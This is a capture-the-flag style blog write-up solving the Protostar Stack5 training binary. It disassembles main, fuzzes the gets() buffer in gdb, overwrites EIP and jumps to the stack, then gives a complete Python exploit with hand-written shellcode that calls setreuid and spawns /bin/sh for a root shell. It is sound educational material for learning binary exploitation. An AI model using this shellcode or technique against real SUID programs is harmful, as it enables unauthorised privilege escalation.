---
title: Protostar - Stack 5
date: 2024-02-15 12:07:15
categories: [binary-exploitation, protostar]
tags: [protostar, binary-exploitation, stack5]
---

# Conquering Stack5 at Protostar Machine

Hello ,H4ck3rs! 

today i will solve [Stack5](https://exploit.education/protostar/stack-five/) at [Protostar](https://exploit.education/protostar) Machine  , i know you are so much excited to see root shell pop out in your screen XD but guess what :D . 
it,s time to see it ;) . 
today we will solve stack5 in this challenge we should get a shell to finish it so we will break steps so it will be easier to understand every step we do


### **Challenge Overview**
- **Challenge Name:** [Stack5](https://exploit.education/protostar/stack-five/)
- **Machine:** [Protostar](https://exploit.education/protostar)



i think you have learned enough from previous [Stack0](/posts/protostar_stack0) [Stack1](/posts/protostar_stack1) [Stack2](/posts/protostar_stack2) [Stack3](/posts/protostar_stack3) [Stack4](/posts/protostar_stack4)

you feel boreing :( and now you wanna a root shell.  aren,t you ? ;) ? but now it,s time to get your epic root shell ;) 
as you see we didn,t use any tools like `msfvenom` or even `debruijn` pattern creation tools like `msf-pattern_offset.rb` , `msf-pattern_create.rb` or `ragg2` by `radare2` Hah ;) .. just like hackers => real hackers understand the topic they interested in from scratch unlike script kiddies .
so we will do every thing from scratch by our lonely terminal and our dirty hand ;)
just `gdb` & `objdump` & `python` are enough for us for make an excellant base while learn binary exploitation !
and now we will continue on the same rythme ;) .

as we used to in the previous , we do 4 steps : explore,analysis,debugging,exploitation

so let,s start our first step :)

### Step 1: Explore Binary

so let,s run our binary `/opt/protostar/bin/stack5`
![Stack5 Explore](/assets/img/protostar/stack5-explore.png)
- notice the binary owned by user and group root but any one can run it because it have `ugo+x` user and group and others can execute it Hmmm Great but notice also it have suid enable so it can be run as owner because it have `u+s` hmmm great . so if we get a shell it will be a root shell! Great XD
- when i run it and prompt for input there is a sound in my head that tell me that the developer still use this vulnerable function XD but untill now i am not sure :)

so to know this let,s analyze our binary to see if what we thinking of is right :)


### Step 2: Analysis
and now the analysis part :D

<img alt="gif"  src="https://media1.tenor.com/m/bdZHqRXCJOAAAAAC/assembly-assembler.gif" width="350rem" height="100rem" />

so let,s disassemble this binary and grep `main` function only.

![Stack 5](/assets/img/protostar/stack5-analysis.png)

1. Function Prologue 
- `push   ebp` : save the base pointer.
- `mov    ebp,esp`: set up new base pointer. and now stack frame was inited
- `and    esp,0xfffffff0`: align the stack.  
- `sub    esp,0x50`: allocate space for local variables with `0x50` byte size

2. Function Calls
- `lea    eax,[esp+0x10]`: load effective address of `[esp+0x10]` now `eax` is pointer for => `[esp+0x10]`
- `mov    DWORD PTR [esp],eax`: store `eax` in `esp` pointer mean at the top of stack, so it `eax` value is just was an arg for `gets` function
- `call   0x080482e8 <gets@plt>`: call `gets` function , Hmmm Again? Thanks, we love Overflow :D

3. Function Epilogue 
- `leave` just a short for => `mov esp,ebp` and `pop ebp` which destory the stack frame inited before .
- `ret` => `pop eip` which will get current value at pointer `esp` and store it in `eip`

you remmember the theory of instruction `call` from [Stack4 Write up](/posts/protostar_stack4) right ?
We will need this knowledge to exploit [Stack5](https://exploit.education/protostar/stack-five/).
So Let,s Start our second step which is will be debugging.

### Step 3: Debugging
 
for now we will start debug our binary  :D

<img alt="gif"  src="https://media1.tenor.com/m/6OvfS_a3aGcAAAAd/uc-davis-cheetos.gif" width="200rem" height="80rem" />

Steps we will perform :

1. writeing our fuzz script as we used to do : `~/fuzz.py`
```py
fuzz="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
print(fuzz)
```

2. open it in gdb and disassemble `main` and create breakpoint on `ret` instruction to see value of `ebp` and `eip` after it
3. run our binary with output of our script `~/fuzz.py` as `stdin`
![Stack5 Debug2](/assets/img/protostar/stack5-gdb-debug.png)

4. when we reach breakpoint we have created , run `info registers` to know value of `ebp`, we can guess `eip` easily after that.  
![Stack5 Debug2](/assets/img/protostar/stack5-gdb-debug2.png)
 Hmmmm so did you notice `ebp`? it,s now hold our fuzz value `0x53535353` which represent ascii `SSSS` .
we are too near , my friend :D . so from the theory of `call` instruction i can expect the value of `eip` after executing `ret` instruction to be `0x54545454` which represented as ascii `TTTT` .
5. then run `si` gdb command to step instruction to run `ret` instruction and see value of `eip` to be sure of about it,s value.
![Stack5 Debug2](/assets/img/protostar/stack5-gdb-debug3.png)
6. now notice the value of `esp` too because we will need it as i will explain later .
now `esp` after executing `leave` which is before `ret` . remmember we create breakpoint at `ret` so `leave` had been executed and `leave` is just a short for as we explain before `mov esp,ebp` then `pop ebp` which destory stack frame had been inited in `Function Prologue`. so our fuzz value have poluated our stack XD , i mean we override the old base pointer (old `ebp`) value so `pop ebp` in which is latest action in `leave` now pop our fuzz value `0x53535353` so `ret` which will be executed after `pop ebp` will be like `pop eip` so it will get the next value on the top of stack which will be `0x54545454` so `esp` now will refer as you see in our in image after destorying stack frame it will be pointed just what after `eip` current value which is `0x54545454`, so esp will be pointed to the string thing after `0x54545454` untill null byte which will be `UUUUVVVVWWWWXXXXYYYYZZZZ` now as you are good stack masher you think in what iam thinking now Hah ? ;) what about ? hijacking eip make it jump to this value which `esp` pointed on and then make it execute what we want ? :D .. let,s discover together if we can do it 


### Step 4: Exploitation

<img alt="gif"  src="https://media1.tenor.com/m/C9qukZqPPS4AAAAC/coding-typing.gif" width="350rem" height="100rem" />

let,s return to theories again .. we now can control `ebp` and `eip` right . for now we will focus on `eip` because with it we can control program execution or flow as it will be always pointer to current instruction in the `code` or `text` segement in memory as you learned in `assembly x86` .. Hmmm let,s do our job !

now we will make `eip` point at `esp` address value when it pointed. 
let,s modify our fuzz script: `~/fuzz.py`

```py
fuzz="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR"
ebp="SSSS"
eip="\xe0\xf7\xff\xbf" # represent 0xbffff7e0 on little endian machines. 0xbffff7e0 is address of esp which we will jump to as you know :)
code_to_execute="\xcc"*4
print(fuzz+ebp+eip+code_to_execute)
```
I know you now thinking what is this code_to_execute ? or what even this hex value represent `\xcc` am i right? hold on my friend , every thing will be explained now :D
as you are creative binary exploiter you know now we need to make eip jump to esp and make it execute what we want Hah?
so we need to redirect execution of eip to code esp will point on and esp after stack frame destructed will point on our code for now
and `\xcc` is hex representation for binary opcode which used to represent `int 3` instruction which create a breakpoint you can check it on on Wikipedia here: [INT3 Wiki](https://en.wikipedia.org/wiki/INT_(x86_instruction))

so now as you get it , debuggers frontend use `\xcc` under the hood to create breakpoint traps
so let,s run our code without debugger for now 
![Stack5 Code Executation Works](/assets/img/protostar/stack5-final-fuzz.png)

Oh Our Code Executed :D 

<img alt="gif"  src="https://media1.tenor.com/m/rO6Fh2KNm3sAAAAd/baby-yes.gif" width="350rem" height="100rem" />

let,s modify our code to add a code that we want it to give a shell
you can pick any one from [ShellStorm](https://shell-storm.org/shellcode/index.html) or create your own if you are better at writeing your own shellcode with assembly lang
so i write my own which first : print `[+] Pwned By Sysc4ll3r #` then `setreuid(geteuid(),geteuid())` to set our id for this process to effective user id then execute `/bin/sh`

so let,s write our dirty exploit ;) : `~/fuzz.py`
```py
fuzz="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR"
ebp="SSSS"
eip="\xe0\xf7\xff\xbf" 
code_to_execute=(
"\x68\x33\x72\x20\x23\x68\x63\x34\x6c\x6c\x68\x20\x53\x79\x73\x68\x64\x20\x42\x79"
"\x68\x50\x77\x6e\x65\x68\x5b\x2b\x5d\x20\x31\xdb\x31\xc9\x31\xd2\x6a\x04\x58\xb3"
"\x01\x89\xe1\xb2\x18\xcd\x80\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd"
"\x80\x31\xc0\x31\xc9\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
"\x6a\x0b\x58\xcd\x80"
)
print(fuzz+ebp+eip+code_to_execute)
```
Let,s run our exploit ;)

![Stack5 Exploit Didn,t Popout Shell](/assets/img/protostar/stack5-presolved.png)


How ?? it didn,t work? . no it,s actually work because our code had been executed because it print `[+] Pwned By Sysc4ll3r #` but didn,t give us a shell :(
Hmmm Remmeber Program take input ? then stop takeing input after shell so there is no `stdin` for shell now it closed so shell closed
let,s pipe our `stdin` to shell
by output our exploit output into `/tmp/fuzz`
then run `cat /tmp/fuzz -`
the secret is in `cat -` because it pipe `stdin`
so when we pipe `stdin` then shell can take input from us 
so let,s run it again
![Stack5 Exploit Works](/assets/img/protostar/stack5-sloved.png)

So who have root shell right now ;)

yeah Hack the planet! XD

<img alt="gif"  src="https://media1.tenor.com/m/K8R7LThju04AAAAC/hack-the-planet.gif" width="500rem" height="100rem" /> 


